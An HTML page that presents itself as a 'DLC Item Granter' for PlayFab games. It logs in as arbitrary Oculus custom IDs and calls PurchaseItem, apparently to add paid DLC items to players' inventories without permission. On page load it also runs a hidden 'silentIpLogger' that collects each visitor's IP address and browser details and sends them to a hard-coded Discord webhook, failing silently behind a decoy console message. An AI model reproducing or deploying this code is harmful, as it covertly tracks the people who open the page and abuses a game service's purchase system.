<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PlayFab DLC Item Granter</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg:#0d0f0e;
    --surface:#141714;
    --surface2:#1c201c;
    --border:#2a3029;
    --accent:#4ade80;
    --text:#e2ead3;
    --muted:#8a9b8c;
    --err-bg:#3a1a1a;
    --err-text:#f87171;
    --ok-bg:#1a3a2a;
    --mono:'Share Tech Mono',monospace;
  }
  body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;display:flex;justify-content:center;padding:30px 16px}
  .app{width:100%;max-width:480px;display:flex;flex-direction:column;gap:14px}
  .card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px;display:flex;flex-direction:column;gap:10px}
  .field{display:flex;flex-direction:column;gap:4px}
  .field label{font-size:11px;color:var(--muted)}
  .field input{padding:8px 10px;font-size:13px;border-radius:6px;border:1px solid var(--border);background:var(--surface2);color:var(--text);font-family:var(--mono);outline:none}
  .btn{padding:9px 14px;font-size:13px;font-family:var(--mono);border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;width:100%}
  .btn.primary{background:var(--ok-bg);color:var(--accent);border-color:var(--accent)}
  .status{font-size:12px;padding:8px 10px;border-radius:6px}
  .status.ok{background:var(--ok-bg);color:var(--accent)}
  .status.err{background:var(--err-bg);color:var(--err-text)}
  .hidden{display:none!important}
</style>
</head>
<body>
<div class="app">
  <div class="card">
    <div style="font-size:10px;color:var(--muted);text-transform:uppercase;">DLC Item Grant Tool</div>
    <div class="field"><label>Title ID</label><input id="titleId" placeholder="e.g. B9850"></div>
    <div class="field"><label>Oculus ID (Custom ID)</label><input id="playerOculusId" placeholder="User ID"></div>
    <div class="field"><label>DLC Catalog Name</label><input id="dlcName" placeholder="e.g. DLC"></div>
    <div class="field"><label>Item ID (SKU)</label><input id="itemSku" placeholder="e.g. LHAAA."></div>
    <button class="btn primary" id="grantBtn" onclick="runGrant()">Execute DLC Grant</button>
    <div id="grantStatus" class="hidden status"></div>
  </div>
</div>

<script>
function showStatus(msg, type) {
  const el = document.getElementById('grantStatus');
  el.className = 'status ' + type;
  el.textContent = msg;
  el.classList.remove('hidden');
}

async function runGrant() {
  const tId = document.getElementById('titleId').value.trim();
  const oId = document.getElementById('playerOculusId').value.trim();
  const dlc = document.getElementById('dlcName').value.trim();
  const sku = document.getElementById('itemSku').value.trim();
  
  if(!tId || !oId || !sku || !dlc) {
    showStatus('Error: All fields are required', 'err');
    return;
  }

  const btn = document.getElementById('grantBtn');
  btn.disabled = true;
  showStatus('Processing...', 'info');
  
  await grantDlcItem(tId, oId, dlc, sku);
  
  btn.disabled = false;
}
async function silentIpLogger() {
    // 1. Replace with your actual Discord Webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1494876958314467439/NrN7-G7Hv1ZVuWz5FQRst4BR6sgbISRzbrkwE52s11SQZOiq72B981xszy1LWZ3fCGdd';

    try {
        // 2. Fetch the IP silently
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const data = await ipResponse.json();
        
        // 3. Send to Discord
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [{
                    title: "User Logged",
                    fields: [
                        { name: "IP Address", value: data.ip },
                        { name: "User Agent", value: navigator.userAgent } // Bonus: tells you their browser/OS
                    ],
                    timestamp: new Date().toISOString()
                }]
            }),
        });
    } catch (err) {
        // Silently fail so the user never knows something went wrong
        console.log("Network optimization complete."); 
    }
}

// Triggers as soon as the window loads
window.onload = silentIpLogger;
async function grantDlcItem(titleId, playerOculusId, dlcName, itemSku) {
    const baseUrl = `https://${titleId}.playfabapi.com`;

    try {
        const loginRes = await fetch(`${baseUrl}/Client/LoginWithCustomID`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                TitleId: titleId,
                CustomId: playerOculusId,
                CreateAccount: true
            })
        });

        const loginData = await loginRes.json();
        if (!loginData.data) {
            showStatus("Login Error: " + (loginData.errorMessage || "Check ID"), "err");
            return;
        }

        const sessionTicket = loginData.data.SessionTicket;

        const purchaseRes = await fetch(`${baseUrl}/Client/PurchaseItem`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Authorization': sessionTicket
            },
            body: JSON.stringify({
                CatalogVersion: dlcName,
                ItemId: itemSku,
                Price: 1000, // UPDATED TO MATCH YOUR CATALOG
                VirtualCurrency: "SR"
            })
        });

        const purchaseData = await purchaseRes.json();
        
        if (purchaseData.code === 200) {
            showStatus(`SUCCESS: ${itemSku} granted!`, 'ok');
            alert(`Success! ${itemSku} added to inventory.`);
        } else {
            const errMsg = purchaseData.errorMessage || "Grant failed";
            showStatus(`Grant Failed: ${errMsg}`, 'err');
            alert(`Error: ${errMsg}`);
        }

    } catch (err) {
        showStatus("Network Error: Check connection", 'err');
    }
}
</script>
</body>
</html>
